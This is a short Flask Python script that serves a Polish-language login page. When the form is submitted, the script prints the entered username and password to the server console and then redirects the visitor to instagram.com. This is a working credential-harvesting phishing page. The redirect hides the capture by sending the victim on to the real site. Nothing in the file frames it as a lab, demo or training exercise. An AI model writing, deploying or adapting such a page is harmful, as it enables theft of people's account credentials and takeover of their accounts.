from flask import Flask, request, render_template_string, redirect

app = Flask(__name__)

html = '''
<!DOCTYPE html>
<html lang="pl">
<head><meta charset="UTF-8"><title>Logowanie</title></head>
<body>
  <h2>Logowanie</h2>
  <form method="POST">
    <input type="text" name="username" placeholder="Nazwa użytkownika" required><br><br>
    <input type="password" name="password" placeholder="Hasło" required><br><br>
    <input type="submit" value="Zaloguj się">
  </form>
</body>
</html>
'''

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user = request.form['username']
        pwd = request.form['password']
        print(f'Login: {user}, Hasło: {pwd}')
        return redirect('https://www.instagram.com')
    return render_template_string(html)

if __name__ == '__main__':
    app.run()